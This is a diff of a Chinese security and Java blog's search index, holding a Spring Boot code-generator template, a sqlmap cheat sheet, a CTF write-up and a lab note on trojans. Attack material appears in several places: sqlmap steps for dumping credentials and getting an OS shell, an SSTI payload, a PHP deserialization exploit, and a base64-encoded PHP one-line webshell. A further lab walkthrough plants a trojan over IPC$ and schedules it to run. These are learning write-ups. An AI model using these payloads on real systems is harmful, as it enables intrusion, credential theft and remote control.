+<span class="hljs-meta">@RequestMapping(<span class="hljs-meta-string">&quot;#if(<span class="hljs-subst">$&#123;package.ModuleName&#125;</span>)/<span class="hljs-subst">$&#123;package.ModuleName&#125;</span>#end/#if(<span class="hljs-subst">$&#123;controllerMappingHyphenStyle&#125;</span>)<span class="hljs-subst">$&#123;controllerMappingHyphen&#125;</span>#else<span class="hljs-subst">$&#123;table.entityPath&#125;</span>#end&quot;</span>)</span>
+#<span class="hljs-keyword">if</span>($&#123;kotlin&#125;)
+<span class="hljs-class"><span class="hljs-keyword">class</span> $</span>&#123;table.controllerName&#125;#<span class="hljs-keyword">if</span>($&#123;superControllerClass&#125;) : $&#123;superControllerClass&#125;()#end
+
+#<span class="hljs-keyword">else</span>
+    #<span class="hljs-keyword">if</span>($&#123;superControllerClass&#125;)
+    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> $</span>&#123;table.controllerName&#125; extends $&#123;superControllerClass&#125; &#123;
+    #<span class="hljs-keyword">else</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> $</span>&#123;table.controllerName&#125; &#123;
+    #end
+
+<span class="hljs-meta">@Resource</span>
+<span class="hljs-keyword">private</span> $&#123;table.serviceName&#125; $&#123;table.entityPath&#125;Service;
+
+<span class="hljs-comment">// 新增或者更新</span>
+<span class="hljs-meta">@PostMapping</span>
+<span class="hljs-keyword">public</span> boolean save(<span class="hljs-meta">@RequestBody</span> $&#123;entity&#125; $&#123;table.entityPath&#125;) &#123;
+        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.saveOrUpdate($&#123;table.entityPath&#125;);
+        &#125;
+
+<span class="hljs-meta">@DeleteMapping(<span class="hljs-meta-string">&quot;/&#123;id&#125;&quot;</span>)</span>
+<span class="hljs-keyword">public</span> <span class="hljs-built_in">Boolean</span> delete(<span class="hljs-meta">@PathVariable</span> Integer id) &#123;
+        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.removeById(id);
+        &#125;
+
+<span class="hljs-meta">@PostMapping(<span class="hljs-meta-string">&quot;/del/batch&quot;</span>)</span>
+<span class="hljs-keyword">public</span> boolean deleteBatch(<span class="hljs-meta">@RequestBody</span> List&lt;Integer&gt; ids) &#123;
+        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.removeByIds(ids);
+        &#125;
+
+<span class="hljs-meta">@GetMapping</span>
+<span class="hljs-keyword">public</span> List&lt;$&#123;entity&#125;&gt; findAll() &#123;
+        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.list();
+        &#125;
+
+<span class="hljs-meta">@GetMapping(<span class="hljs-meta-string">&quot;/&#123;id&#125;&quot;</span>)</span>
+<span class="hljs-keyword">public</span> $&#123;entity&#125; findOne(<span class="hljs-meta">@PathVariable</span> Integer id) &#123;
+        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.getById(id);
+        &#125;
+
+<span class="hljs-meta">@GetMapping(<span class="hljs-meta-string">&quot;/page&quot;</span>)</span>
+<span class="hljs-keyword">public</span> Page&lt;$&#123;entity&#125;&gt; findPage(<span class="hljs-meta">@RequestParam</span> Integer pageNum,
+<span class="hljs-meta">@RequestParam</span> Integer pageSize) &#123;
+        LambdaQueryWrapper&lt;$&#123;entity&#125;&gt; queryWrapper = new LambdaQueryWrapper&lt;&gt;();
+        queryWrapper.orderByDesc(<span class="hljs-string">&quot;id&quot;</span>);
+        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.page(new Page&lt;&gt;(pageNum, pageSize), queryWrapper);
+        &#125;
+
+&#125;
+
+#end
+</code></pre>
+
+<p>更多的模板可以到<code>com.baomidou.mybatis-plus-generator</code>包中复制到项目的<code>resources\templates</code>中，根据自己的需求修改模板</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220513194907662.png" alt="image-20220513194907662"></p>
+]]></content>
       <categories>
-        <category>ctf</category>
+        <category>javaweb</category>
       </categories>
       <tags>
-        <tag>sql</tag>
+        <tag>springboot</tag>
       </tags>
   </entry>
   <entry>
@@ -4490,6 +4697,35 @@ flag = <span class="hljs-string">&quot;&quot;</span>
 print(flag)</code></pre>
 
 ]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqlmap</title>
+    <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><span id="more"></span>
+
+<p>第一步:</p>
+<pre><code>-u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测</code></pre><p>第二步:</p>
+<pre><code>-u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取</code></pre><p>第三步:</p>
+<pre><code>-u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举</code></pre><p>第四步:</p>
+<pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举</code></pre><p>第五步:</p>
+<pre><code>-u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump
+//探测user表name和password字段</code></pre><p>如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字<br>典进行爆破。</p>
+<p>第六步:</p>
+<pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言</code></pre><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>order by * </p>
+<p>group by *</p>
+<p>利用内置函数暴数据库信息</p>
+<p>version() 查看数据库版本</p>
+<p>database() 查看当前数据库名</p>
+<p>user() 查看当前用户</p>
+<p>查看表：</p>
+<pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre><p>可十六进制查看字段：</p>
+<pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;</code></pre>]]></content>
       <categories>
         <category>ctf</category>
       </categories>
@@ -4845,6 +5081,121 @@ video/mp4
         <tag>大小写绕过</tag>
         <tag>.htaccess</tag>
         <tag>windows文件特性</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>cumt华为杯</title>
+    <url>/2020/10/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/</url>
+    <content><![CDATA[<h1 id="cumt-华为杯"><a href="#cumt-华为杯" class="headerlink" title="cumt_华为杯"></a>cumt_华为杯</h1><p>经典的学长虐菜局，web只做出来一个，另外两题好不容易有思路了，都被卡死了</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h3><p>真签到题，抽个奖就给出了flag</p>
+<h3 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h3><p>刚进入页面，只有一张图片，查看源码也没发现什么</p>
+<p>就是了模板注入</p>
+<pre><code class="hljs handlebars"><span class="xml">url+</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="xml">Copy</span></code></pre>
+
+<p>页面出现404报错，并且显示的是url+49，确定是模板注入</p>
+<pre><code class="hljs sqf">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()&#125;&#125;
+查看模块时，发现存在waf
+经过测试发现是过滤了[]
+于是使用
+&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>()&#125;&#125;
+存在file模块
+用read读取文件内容
+<span class="hljs-built_in">exp</span>:
+<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">&#x27;/flag&#x27;</span>).read()Copy</code></pre>
+
+<p>参考链接：<a href="https://xz.aliyun.com/t/8029">https://xz.aliyun.com/t/8029</a></p>
+<h3 id="VulnCMS"><a href="#VulnCMS" class="headerlink" title="VulnCMS"></a>VulnCMS</h3><p>这题是真滴无语，开始以为是XSS，后来学长提示不是，又找到了文件上传的漏洞，直接拿到了网站根目录本以为做出了，结果提示flag not here,心态炸裂，但是提示了”投个稿？“，应该是在投稿位置下功夫吧。到最后也没做出了，但是找到了漏洞代码，应该是sql注入。</p>
+<p><a href="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png"><img src="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png" alt="cms.png"></a></p>
+<p>这里给出大神的做法</p>
+<p><a href="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png"><img src="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png" alt="cms1.png"></a></p>
+<h3 id="Hodor"><a href="#Hodor" class="headerlink" title="Hodor"></a>Hodor</h3><p>这题基本上是原题，但是加了一层过滤，怎么都没绕过去。。。</p>
+<p>看到WP是大S绕过，涨知识了</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">Source</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">return</span> highlight_file(<span class="hljs-string">&#x27;license.txt&#x27;</span>, <span class="hljs-literal">true</span>).highlight_file(<span class="hljs-keyword">$this</span>-&gt;source, <span class="hljs-literal">true</span>);
+    &#125;
+&#125;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">easy_check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;
+    <span class="hljs-comment">//echo $str;</span>
+    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$matches</span>)) &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+    &#125;
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+&#125;
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))&#123;
+    <span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> Source();
+    <span class="hljs-variable">$s</span>-&gt;source = <span class="hljs-keyword">__FILE__</span>;
+
+    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;
+    <span class="hljs-keyword">exit</span>;
+&#125;
+<span class="hljs-variable">$todos</span> = [];
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>]))&#123;
+    <span class="hljs-keyword">if</span>(!easy_check(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>])) &#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!\n&quot;</span>;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>];
+        <span class="hljs-variable">$h</span> = substr(<span class="hljs-variable">$c</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);
+        <span class="hljs-variable">$m</span> = substr(<span class="hljs-variable">$c</span>, <span class="hljs-number">32</span>);
+        <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$m</span>) === <span class="hljs-variable">$h</span>)&#123;
+            <span class="hljs-variable">$todos</span> = unserialize(<span class="hljs-variable">$m</span>);
+        &#125;
+    &#125;
+&#125;
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;text&#x27;</span>]))&#123;
+    <span class="hljs-variable">$todo</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;text&#x27;</span>];
+
+    <span class="hljs-variable">$todos</span>[] = <span class="hljs-variable">$todo</span>;
+    <span class="hljs-variable">$m</span> = serialize(<span class="hljs-variable">$todos</span>);
+    <span class="hljs-variable">$h</span> = md5(<span class="hljs-variable">$m</span>);
+
+    setcookie(<span class="hljs-string">&#x27;todos&#x27;</span>, <span class="hljs-variable">$h</span>.<span class="hljs-variable">$m</span>);
+    header(<span class="hljs-string">&#x27;Location: &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]);
+    <span class="hljs-keyword">exit</span>;
+&#125;
+<span class="hljs-comment">// flag is in flag.php</span>
+?Copy</code></pre>
+
+<p>exp</p>
+<pre><code class="hljs rust">echo md5(<span class="hljs-symbol">&#x27;a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Source&quot;</span>:<span class="hljs-number">1</span>:
+&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;S:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\66lag.php&quot;</span>;&#125;&#125;&#x27;);
+echo urlencode(<span class="hljs-symbol">&#x27;ae5860e508aaf353a9ad78ac246f46fba</span>:<span class="hljs-number">2</span>:
+&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Source&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;S:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\66lag.php&quot;</span>;&#125;&#125;&#x27;);<span class="hljs-built_in">Copy</span></code></pre>
+
+<p><a href="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png"><img src="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png" alt="hodor.png"></a></p>
+<p>参考</p>
+<p><a href="https://blog.csdn.net/SmileAndFun/article/details/108497183">https://blog.csdn.net/SmileAndFun/article/details/108497183</a></p>
+<h3 id="webcms"><a href="#webcms" class="headerlink" title="webcms"></a>webcms</h3><p>是一个博客管理的网站，其实也是个原题，考察点是文件上传</p>
+<p>漏洞点在图片中上传图片的位置</p>
+<p><a href="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png"><img src="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png" alt="webcms.png"></a></p>
+<p>随便上传一张图片试试，抓包结果如下，几个注意点</p>
+<p><a href="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png"><img src="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png" alt="webcms2.png"></a></p>
+<blockquote>
+<p>1.filetype规定了文件的类型</p>
+<p>2.上传时，将图片保存为了base64形式</p>
+<p>所以上传一句话木马的时候要注意修改对应的位置</p>
+</blockquote>
+<p>一句话木马类型为php,则filetype改为php</p>
+<p>内容为密码为cmd一句话木马，对应的base64编码<code>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</code></p>
+<p><a href="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png"><img src="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png" alt="webcms3.png"></a></p>
+<p>上传成功，访问保存的路径：<code>http://219.219.61.234:20203/upload/tmp/1_Y2R8AK57UWV4JBW.php</code></p>
+<pre><code class="hljs css">POST:
+cmd=<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);
+或者蚁剑连接，密码cmdCopy</code></pre>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>MIsc部分基本都是队友做的，好像也不是太难</p>
+<h3 id="伪web"><a href="#伪web" class="headerlink" title="伪web"></a>伪web</h3><p>真是伪web。。。</p>
+<p>直接在文件里搜索就能到flag</p>
+<p>搜索关键词cmut，flag所在文件夹为html\include\include.php</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>unserialize</tag>
+        <tag>ssti</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -5238,119 +5589,24 @@ $_POST    &amp;&amp; SafeFilter($_POST);
       </tags>
   </entry>
   <entry>
-    <title>cumt华为杯</title>
-    <url>/2020/10/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/</url>
-    <content><![CDATA[<h1 id="cumt-华为杯"><a href="#cumt-华为杯" class="headerlink" title="cumt_华为杯"></a>cumt_华为杯</h1><p>经典的学长虐菜局，web只做出来一个，另外两题好不容易有思路了，都被卡死了</p>
-<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h3><p>真签到题，抽个奖就给出了flag</p>
-<h3 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h3><p>刚进入页面，只有一张图片，查看源码也没发现什么</p>
-<p>就是了模板注入</p>
-<pre><code class="hljs handlebars"><span class="xml">url+</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="xml">Copy</span></code></pre>
-
-<p>页面出现404报错，并且显示的是url+49，确定是模板注入</p>
-<pre><code class="hljs sqf">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()&#125;&#125;
-查看模块时，发现存在waf
-经过测试发现是过滤了[]
-于是使用
-&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>()&#125;&#125;
-存在file模块
-用read读取文件内容
-<span class="hljs-built_in">exp</span>:
-<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">&#x27;/flag&#x27;</span>).read()Copy</code></pre>
-
-<p>参考链接：<a href="https://xz.aliyun.com/t/8029">https://xz.aliyun.com/t/8029</a></p>
-<h3 id="VulnCMS"><a href="#VulnCMS" class="headerlink" title="VulnCMS"></a>VulnCMS</h3><p>这题是真滴无语，开始以为是XSS，后来学长提示不是，又找到了文件上传的漏洞，直接拿到了网站根目录本以为做出了，结果提示flag not here,心态炸裂，但是提示了”投个稿？“，应该是在投稿位置下功夫吧。到最后也没做出了，但是找到了漏洞代码，应该是sql注入。</p>
-<p><a href="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png"><img src="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png" alt="cms.png"></a></p>
-<p>这里给出大神的做法</p>
-<p><a href="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png"><img src="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png" alt="cms1.png"></a></p>
-<h3 id="Hodor"><a href="#Hodor" class="headerlink" title="Hodor"></a>Hodor</h3><p>这题基本上是原题，但是加了一层过滤，怎么都没绕过去。。。</p>
-<p>看到WP是大S绕过，涨知识了</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">Source</span> </span>&#123;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;
-        <span class="hljs-keyword">return</span> highlight_file(<span class="hljs-string">&#x27;license.txt&#x27;</span>, <span class="hljs-literal">true</span>).highlight_file(<span class="hljs-keyword">$this</span>-&gt;source, <span class="hljs-literal">true</span>);
-    &#125;
-&#125;
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">easy_check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;
-    <span class="hljs-comment">//echo $str;</span>
-    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$matches</span>)) &#123;
-        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
-    &#125;
-    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
-&#125;
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))&#123;
-    <span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> Source();
-    <span class="hljs-variable">$s</span>-&gt;source = <span class="hljs-keyword">__FILE__</span>;
-
-    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;
-    <span class="hljs-keyword">exit</span>;
-&#125;
-<span class="hljs-variable">$todos</span> = [];
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>]))&#123;
-    <span class="hljs-keyword">if</span>(!easy_check(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>])) &#123;
-        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!\n&quot;</span>;
-    &#125; <span class="hljs-keyword">else</span> &#123;
-        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>];
-        <span class="hljs-variable">$h</span> = substr(<span class="hljs-variable">$c</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);
-        <span class="hljs-variable">$m</span> = substr(<span class="hljs-variable">$c</span>, <span class="hljs-number">32</span>);
-        <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$m</span>) === <span class="hljs-variable">$h</span>)&#123;
-            <span class="hljs-variable">$todos</span> = unserialize(<span class="hljs-variable">$m</span>);
-        &#125;
-    &#125;
-&#125;
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;text&#x27;</span>]))&#123;
-    <span class="hljs-variable">$todo</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;text&#x27;</span>];
-
-    <span class="hljs-variable">$todos</span>[] = <span class="hljs-variable">$todo</span>;
-    <span class="hljs-variable">$m</span> = serialize(<span class="hljs-variable">$todos</span>);
-    <span class="hljs-variable">$h</span> = md5(<span class="hljs-variable">$m</span>);
-
-    setcookie(<span class="hljs-string">&#x27;todos&#x27;</span>, <span class="hljs-variable">$h</span>.<span class="hljs-variable">$m</span>);
-    header(<span class="hljs-string">&#x27;Location: &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]);
-    <span class="hljs-keyword">exit</span>;
-&#125;
-<span class="hljs-comment">// flag is in flag.php</span>
-?Copy</code></pre>
-
-<p>exp</p>
-<pre><code class="hljs rust">echo md5(<span class="hljs-symbol">&#x27;a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Source&quot;</span>:<span class="hljs-number">1</span>:
-&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;S:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\66lag.php&quot;</span>;&#125;&#125;&#x27;);
-echo urlencode(<span class="hljs-symbol">&#x27;ae5860e508aaf353a9ad78ac246f46fba</span>:<span class="hljs-number">2</span>:
-&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Source&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;S:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\66lag.php&quot;</span>;&#125;&#125;&#x27;);<span class="hljs-built_in">Copy</span></code></pre>
-
-<p><a href="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png"><img src="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png" alt="hodor.png"></a></p>
-<p>参考</p>
-<p><a href="https://blog.csdn.net/SmileAndFun/article/details/108497183">https://blog.csdn.net/SmileAndFun/article/details/108497183</a></p>
-<h3 id="webcms"><a href="#webcms" class="headerlink" title="webcms"></a>webcms</h3><p>是一个博客管理的网站，其实也是个原题，考察点是文件上传</p>
-<p>漏洞点在图片中上传图片的位置</p>
-<p><a href="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png"><img src="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png" alt="webcms.png"></a></p>
-<p>随便上传一张图片试试，抓包结果如下，几个注意点</p>
-<p><a href="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png"><img src="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png" alt="webcms2.png"></a></p>
-<blockquote>
-<p>1.filetype规定了文件的类型</p>
-<p>2.上传时，将图片保存为了base64形式</p>
-<p>所以上传一句话木马的时候要注意修改对应的位置</p>
-</blockquote>
-<p>一句话木马类型为php,则filetype改为php</p>
-<p>内容为密码为cmd一句话木马，对应的base64编码<code>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</code></p>
-<p><a href="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png"><img src="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png" alt="webcms3.png"></a></p>
-<p>上传成功，访问保存的路径：<code>http://219.219.61.234:20203/upload/tmp/1_Y2R8AK57UWV4JBW.php</code></p>
-<pre><code class="hljs css">POST:
-cmd=<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);
-或者蚁剑连接，密码cmdCopy</code></pre>
-
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>MIsc部分基本都是队友做的，好像也不是太难</p>
-<h3 id="伪web"><a href="#伪web" class="headerlink" title="伪web"></a>伪web</h3><p>真是伪web。。。</p>
-<p>直接在文件里搜索就能到flag</p>
-<p>搜索关键词cmut，flag所在文件夹为html\include\include.php</p>
+    <title>木马</title>
+    <url>/2020/07/18/%E6%9C%A8%E9%A9%AC/</url>
+    <content><![CDATA[<h1 id="初识木马"><a href="#初识木马" class="headerlink" title="初识木马"></a>初识木马</h1><span id="more"></span>
+<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p><strong>使用灰鸽子软件以及端口爆破软件控制目的主机</strong></p>
+<p>准备一台xp，一台2003<br>其中xp地址为10.1.1.3/24 2003为10.1.1.1/24<br>使两个主机能够通信<br>xp作为攻击方，2003为受害者</p>
+<h3 id="1-制作木马"><a href="#1-制作木马" class="headerlink" title="1.制作木马"></a>1.制作木马</h3><p>使用灰鸽子制作木马，将木马生成在在桌面（记住路径之后要使用）<br><img src="https://i.loli.net/2020/11/30/xci7NTtIXgeODkz.png" alt><br><img src="https://i.loli.net/2020/11/30/H38gByNiumIE1t7.png" alt></p>
+<h3 id="2-扫描主机，并对账号密码进行爆破"><a href="#2-扫描主机，并对账号密码进行爆破" class="headerlink" title="2.扫描主机，并对账号密码进行爆破"></a>2.扫描主机，并对账号密码进行爆破</h3><p>ip起始地址为10.1.1.1-10.1.1.255<br>密码配置文件<br><img src="https://i.loli.net/2020/11/30/8gSyYGJxjvqTaDR.png" alt><br>其实只要扫描10.1.1.1即可（因为是实验）</p>
+<p>获取账号密码<br>username：administrator<br>password: “”</p>
+<h3 id="3-与目标主机建立IPC"><a href="#3-与目标主机建立IPC" class="headerlink" title="3.与目标主机建立IPC$"></a>3.与目标主机建立IPC$</h3><p><code>net use \\10.1.1.1\ipc$ &quot;&quot; \user:administrator</code></p>
+<h3 id="4-植入木马到目标主机"><a href="#4-植入木马到目标主机" class="headerlink" title="4.植入木马到目标主机"></a>4.植入木马到目标主机</h3><p><code>copy C:\Documents and Settings\shimisi\桌面\qq.exe  \\10.1.1.1\ipc$</code></p>
+<h3 id="5-设置目标主机运行木马"><a href="#5-设置目标主机运行木马" class="headerlink" title="5.设置目标主机运行木马"></a>5.设置目标主机运行木马</h3><p><code>net time \\10.1.1.1</code>根据目标主机时间设置事物的开始时间<br><code>at \\10.1.1.1 17:17 c:\qq.exe</code>在上面的时间之后三分钟左右设置一个事物<br>即在17：17时运行木马文件</p>
